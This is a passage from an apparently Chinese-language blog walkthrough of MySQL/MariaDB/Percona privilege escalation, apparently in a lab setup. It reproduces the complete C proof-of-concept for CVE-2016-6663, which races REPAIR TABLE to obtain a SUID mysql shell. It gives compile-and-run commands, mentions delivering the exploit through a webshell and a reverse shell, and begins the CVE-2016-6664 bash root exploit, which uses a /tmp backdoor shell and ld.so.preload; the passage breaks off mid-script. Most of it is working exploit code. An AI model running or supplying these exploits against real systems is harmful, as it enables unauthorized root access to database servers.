class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;grp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;mysql.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pwd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/inotify.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> EXP_PATH          <span class="hljs-meta-string">&quot;/tmp/mysql_privesc_exploit&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> EXP_DIRN          <span class="hljs-meta-string">&quot;mysql_privesc_exploit&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MYSQL_TAB_FILE    EXP_PATH <span class="hljs-meta-string">&quot;/exploit_table.MYD&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MYSQL_TEMP_FILE   EXP_PATH <span class="hljs-meta-string">&quot;/exploit_table.TMD&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SUID_SHELL   	  EXP_PATH <span class="hljs-meta-string">&quot;/mysql_suid_shell.MYD&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_DELAY 1000    <span class="hljs-comment">// can be used in the race to adjust the timing if necessary</span></span><br><br>MYSQL *conn;		  <span class="hljs-comment">// DB handles</span><br>MYSQL_RES *res;<br>MYSQL_ROW row;<br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> cnt;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">intro</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">printf</span>( <br>        <span class="hljs-string">&quot;\033[94m\n&quot;</span><br>        <span class="hljs-string">&quot;MySQL/Percona/MariaDB - Privilege Escalation / Race Condition PoC Exploit\n&quot;</span><br>        <span class="hljs-string">&quot;mysql-privesc-race.c (ver. 1.0)\n\n&quot;</span><br>        <span class="hljs-string">&quot;CVE-2016-6663 / CVE-2016-5616\n\n&quot;</span><br>        <span class="hljs-string">&quot;For testing purposes only. Do no harm.\n\n&quot;</span><br>	<span class="hljs-string">&quot;Discovered/Coded by:\n\n&quot;</span><br>	<span class="hljs-string">&quot;Dawid Golunski \n&quot;</span><br>	<span class="hljs-string">&quot;http://legalhackers.com&quot;</span><br>        <span class="hljs-string">&quot;\033[0m\n\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">usage</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *argv0)</span> </span>&#123;<br>    <span class="hljs-built_in">intro</span>();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage:\n\n%s user pass db_host database\n\n&quot;</span>, argv0);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mysql_cmd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *sql_cmd, <span class="hljs-keyword">int</span> silent)</span> </span>&#123;<br>    <br>    <span class="hljs-keyword">if</span> (!silent) &#123;<br>	    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s \n&quot;</span>, sql_cmd);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">mysql_query</span>(conn, sql_cmd)) &#123;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;%s\n&quot;</span>, <span class="hljs-built_in">mysql_error</span>(conn));<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    res = <span class="hljs-built_in">mysql_store_result</span>(conn);<br>    <span class="hljs-keyword">if</span> (res&gt;<span class="hljs-number">0</span>) <span class="hljs-built_in">mysql_free_result</span>(res);<br><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">int</span> randomnum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> io_notified = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> myd_handle;<br>    <span class="hljs-keyword">int</span> wpid;<br>    <span class="hljs-keyword">int</span> is_shell_suid=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">pid_t</span> pid;<br>    <span class="hljs-keyword">int</span> status;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>    <span class="hljs-comment">/* io notify */</span><br>    <span class="hljs-keyword">int</span> fd;<br>    <span class="hljs-keyword">int</span> ret;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4096</span>] __attribute__((<span class="hljs-built_in">aligned</span>(<span class="hljs-number">8</span>)));<br>    <span class="hljs-keyword">int</span> num_read;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inotify_event</span> *<span class="hljs-title">event</span>;</span><br>    <span class="hljs-comment">/* credentials */</span><br>    <span class="hljs-keyword">char</span> *user     = argv[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">char</span> *password = argv[<span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">char</span> *db_host  = argv[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">char</span> *database = argv[<span class="hljs-number">4</span>];<br><br><br>    <span class="hljs-comment">// Disable buffering of stdout</span><br>    <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// Get the params</span><br>    <span class="hljs-keyword">if</span> (argc!=<span class="hljs-number">5</span>) &#123;<br>	<span class="hljs-built_in">usage</span>(argv[<span class="hljs-number">0</span>]);<br>	<span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125; <br>    <span class="hljs-built_in">intro</span>();<br>    <span class="hljs-comment">// Show initial privileges</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[+] Starting the exploit as: \n&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;id&quot;</span>);<br><br>    <span class="hljs-comment">// Connect to the database server with provided credentials</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[+] Connecting to the database `%s` as %s@%s\n&quot;</span>, database, user, db_host);<br>    conn = <span class="hljs-built_in">mysql_init</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">mysql_real_connect</span>(conn, db_host, user, password, database, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;%s\n&quot;</span>, <span class="hljs-built_in">mysql_error</span>(conn));<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// Prepare tmp dir</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[+] Creating exploit temp directory %s\n&quot;</span>, <span class="hljs-string">&quot;/tmp/&quot;</span> EXP_DIRN);<br>    <span class="hljs-built_in">umask</span>(<span class="hljs-number">000</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;rm -rf /tmp/&quot;</span> EXP_DIRN <span class="hljs-string">&quot; &amp;&amp; mkdir /tmp/&quot;</span> EXP_DIRN);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;chmod g+s /tmp/&quot;</span> EXP_DIRN );<br><br>    <span class="hljs-comment">// Prepare exploit tables :)</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[+] Creating mysql tables \n\n&quot;</span>);<br>    <span class="hljs-built_in">mysql_cmd</span>(<span class="hljs-string">&quot;DROP TABLE IF EXISTS exploit_table&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">mysql_cmd</span>(<span class="hljs-string">&quot;DROP TABLE IF EXISTS mysql_suid_shell&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">mysql_cmd</span>(<span class="hljs-string">&quot;CREATE TABLE exploit_table (txt varchar(50)) engine = &#x27;MyISAM&#x27; data directory &#x27;&quot;</span> EXP_PATH <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">mysql_cmd</span>(<span class="hljs-string">&quot;CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = &#x27;MyISAM&#x27; data directory &#x27;&quot;</span> EXP_PATH <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// Copy /bin/bash into the mysql_suid_shell.MYD mysql table file</span><br>    <span class="hljs-comment">// The file should be owned by mysql:attacker thanks to the sticky bit on the table directory</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[+] Copying bash into the mysql_suid_shell table.\n    After the exploitation the following file/table will be assigned SUID and executable bits : \n&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cp /bin/bash &quot;</span> SUID_SHELL);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls -l &quot;</span> SUID_SHELL);<br><br>    <span class="hljs-comment">// Use inotify to get the timing right</span><br>    fd = <span class="hljs-built_in">inotify_init</span>();<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;failed to inotify_init\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    ret = <span class="hljs-built_in">inotify_add_watch</span>(fd, EXP_PATH, IN_CREATE | IN_CLOSE);<br><br><br>    <span class="hljs-comment">/* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[+] Entering the race loop... Hang in there...\n&quot;</span>);<br><br>    <span class="hljs-keyword">while</span> ( is_shell_suid != <span class="hljs-number">1</span> ) &#123;<br><br>        cnt++;<br>	<span class="hljs-keyword">if</span> ( (cnt % <span class="hljs-number">100</span>) == <span class="hljs-number">0</span> ) &#123;<br>	 	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-&gt;&quot;</span>);<br>	 	<span class="hljs-comment">//fflush(stdout);	</span><br>	&#125;<br><br>        <span class="hljs-comment">/* Create empty file , remove if already exists */</span><br>        <span class="hljs-built_in">unlink</span>(MYSQL_TEMP_FILE);<br>        <span class="hljs-built_in">unlink</span>(MYSQL_TAB_FILE);<br>   	<span class="hljs-built_in">mysql_cmd</span>(<span class="hljs-string">&quot;DROP TABLE IF EXISTS exploit_table&quot;</span>, <span class="hljs-number">1</span>);<br>	<span class="hljs-built_in">mysql_cmd</span>(<span class="hljs-string">&quot;CREATE TABLE exploit_table (txt varchar(50)) engine = &#x27;MyISAM&#x27; data directory &#x27;&quot;</span> EXP_PATH <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">1</span>);<br><br>	<span class="hljs-comment">/* random num if needed */</span><br>        <span class="hljs-built_in">srand</span> ( <span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>) );<br>        randomnum = ( <span class="hljs-built_in">rand</span>() % MAX_DELAY );<br><br>        <span class="hljs-comment">// Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink</span><br>        pid = fork();<br>        <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Fork failed :(\n&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* Child process - executes REPAIR TABLE  SQL statement */</span><br>        <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">usleep</span>(<span class="hljs-number">500</span>);<br>            <span class="hljs-built_in">unlink</span>(MYSQL_TEMP_FILE);<br>	    <span class="hljs-built_in">mysql_cmd</span>(<span class="hljs-string">&quot;REPAIR TABLE exploit_table EXTENDED&quot;</span>, <span class="hljs-number">1</span>);<br>            <span class="hljs-comment">// child stops here</span><br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* Parent process - aims to replace the temp .tmd table with a symlink before chmod */</span><br>        <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span> ) &#123;<br>            io_notified = <span class="hljs-number">0</span>;<br><br>            <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">int</span> processed = <span class="hljs-number">0</span>;<br>                ret = <span class="hljs-built_in">read</span>(fd, buf, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf));<br>                <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">while</span> (processed &lt; ret) &#123;<br>                    event = (struct inotify_event *)(buf + processed);<br>                    <span class="hljs-keyword">if</span> (event-&gt;mask &amp; IN_CLOSE) &#123;<br>                        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(event-&gt;name, <span class="hljs-string">&quot;exploit_table.TMD&quot;</span>)) &#123;<br>                            <span class="hljs-comment">//usleep(randomnum);</span><br><br>			    <span class="hljs-comment">// Set the .MYD permissions to suid+exec before they get copied to the .TMD file </span><br>			    <span class="hljs-built_in">unlink</span>(MYSQL_TAB_FILE);<br>			    myd_handle = <span class="hljs-built_in">open</span>(MYSQL_TAB_FILE, O_CREAT, <span class="hljs-number">0777</span>);<br>			    <span class="hljs-built_in">close</span>(myd_handle);<br>			    <span class="hljs-built_in">chmod</span>(MYSQL_TAB_FILE, <span class="hljs-number">04777</span>);<br><br>			    <span class="hljs-comment">// Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec</span><br>                            <span class="hljs-built_in">unlink</span>(MYSQL_TEMP_FILE);<br>                            <span class="hljs-built_in">symlink</span>(SUID_SHELL, MYSQL_TEMP_FILE);<br>                            io_notified=<span class="hljs-number">1</span>;<br>                        &#125;<br>                    &#125;<br>                    processed += <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(struct inotify_event);<br>                &#125;<br>                <span class="hljs-keyword">if</span> (io_notified) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br><br><br>            <span class="hljs-built_in">waitpid</span>(pid, &amp;status, <span class="hljs-number">0</span>);<br>        &#125;<br><br>	<span class="hljs-comment">// Check if SUID bit was set at the end of this attempt</span><br>        <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">lstat</span>(SUID_SHELL, &amp;st) == <span class="hljs-number">0</span> ) &#123;<br>	    <span class="hljs-keyword">if</span> (st.st_mode &amp; S_ISUID) &#123;<br>		is_shell_suid = <span class="hljs-number">1</span>;<br>	    &#125;<br>        &#125; <br><br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\n[+] \033[94mBingo! Race won (took %lu tries) !\033[0m Check out the \033[94mmysql SUID shell\033[0m: \n\n&quot;</span>, cnt);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls -l &quot;</span> SUID_SHELL);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[+] Spawning the \033[94mmysql SUID shell\033[0m now... \n    Remember that from there you can gain \033[1;31mroot\033[0m with vuln \033[1;31mCVE-2016-6662\033[0m or \033[1;31mCVE-2016-6664\033[0m :)\n\n&quot;</span>);<br>    <span class="hljs-built_in">system</span>(SUID_SHELL <span class="hljs-string">&quot; -p -i &quot;</span>);<br>    <span class="hljs-comment">//system(SUID_SHELL &quot; -p -c &#x27;/bin/bash -i -p&#x27;&quot;);</span><br><br>    <span class="hljs-comment">/* close MySQL connection and exit */</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[+] Job done. Exiting\n\n&quot;</span>);<br>    <span class="hljs-built_in">mysql_close</span>(conn);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们通过菜刀写入exp：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv10.png?raw=true" srcset="/img/loading.gif" lazyload></p>
+<p>菜刀这里执行总失败，我通过写入另一个shell反弹之后编译并执行</p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/<span class="hljs-keyword">include</span>/mysql -lmysqlclient<br>./mysql-privesc-race <span class="hljs-keyword">test</span> <span class="hljs-number">123456</span> localhost <span class="hljs-keyword">test</span><br></code></pre></td></tr></table></figure>
+
+<p>成功提权</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv11.png?raw=true" srcset="/img/loading.gif" lazyload></p>
+<h3 id="mysql提升为root权限"><a href="#mysql提升为root权限" class="headerlink" title="mysql提升为root权限"></a>mysql提升为root权限</h3><p>tutum/lamp日志方式不是默认的基于文件的日志，而是syslog，所以我们首先要将它改为默认配置</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/my</span>sql<span class="hljs-regexp">/conf.d/my</span>sqld_safe_syslog.cnf<br></code></pre></td></tr></table></figure>
+<p>删除掉syslog，然后重启mysql，查看是否更改成功，如果更改成功，下面命令产生空结果</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -r syslog <span class="hljs-regexp">/etc/my</span>sqlsqld_safe_syslog.cnf<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv12.png?raw=true" srcset="/img/loading.gif" lazyload></p>
+<p>CVE-2016-6664 exp网址：<a target="_blank" rel="noopener" href="http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html">http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html</a></p>
+<p>CVE-2016-6664 exp：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#!/bin/bash -p</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># MySQL / MariaDB / PerconaDB - Root Privilege Escalation PoC Exploit</span><br><span class="hljs-comment"># mysql-chowned.sh (ver. 1.0)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># CVE-2016-6664 / OCVE-2016-5617</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Discovered and coded by:</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Dawid Golunski</span><br><span class="hljs-comment"># dawid[at]legalhackers.com</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># https://legalhackers.com</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Follow https://twitter.com/dawid_golunski for updates on this advisory.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This PoC exploit allows attackers to (instantly) escalate their privileges</span><br><span class="hljs-comment"># from mysql system account to root through unsafe error log handling.</span><br><span class="hljs-comment"># The exploit requires that file-based logging has been configured (default).</span><br><span class="hljs-comment"># To confirm that syslog logging has not been enabled instead use:</span><br><span class="hljs-comment"># grep -r syslog /etc/mysql</span><br><span class="hljs-comment"># which should return no results.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This exploit can be chained with the following vulnerability:</span><br><span class="hljs-comment"># CVE-2016-6663 / OCVE-2016-5616</span><br><span class="hljs-comment"># which allows attackers to gain access to mysql system account (mysql shell).</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># In case database server has been configured with syslog you may also use:</span><br><span class="hljs-comment"># CVE-2016-6662 as an alternative to this exploit.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Usage:</span><br><span class="hljs-comment"># ./mysql-chowned.sh path_to_error.log </span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># See the full advisory for details at:</span><br><span class="hljs-comment"># https://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Video PoC:</span><br><span class="hljs-comment"># https://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Disclaimer:</span><br><span class="hljs-comment"># For testing purposes only. Do no harm.</span><br><span class="hljs-comment">#</span><br><br>BACKDOORSH=<span class="hljs-string">&quot;/bin/bash&quot;</span><br>BACKDOORPATH=<span class="hljs-string">&quot;/tmp/mysqlrootsh&quot;</span><br>PRIVESCLIB=<span class="hljs-string">&quot;/tmp/privesclib.so&quot;</span><br>PRIVESCSRC=<span class="hljs-string">&quot;/tmp/privesclib.c&quot;</span><br>SUIDBIN=<span class="hljs-string">&quot;/usr/bin/sudo&quot;</span><br><br><span class="hljs-keyword">function</span> cleanexit &#123;<br>    <span class="hljs-comment"># Cleanup </span><br>    echo -e <span class="hljs-string">&quot;\n[+] Cleaning up...&quot;</span><br>    rm -f <span class="hljs-variable">$PRIVESCSRC</span><br>    rm -f <span class="hljs-variable">$PRIVESCLIB</span><br>    rm -f <span class="hljs-variable">$ERRORLOG</span><br>    touch <span class="hljs-variable">$ERRORLOG</span><br>    <span class="hljs-keyword">if</span> [ -f <span class="hljs-regexp">/etc/</span>ld.so.preload ]; then<br>        echo -n &gt; <span class="hljs-regexp">/etc/</span>ld.so.preload<br>    fi<br>    echo -e <span class="hljs-string">&quot;\n[+] Job done. Exiting with code $1 \n&quot;</span><br>    <span class="hljs-keyword">exit</span> <span 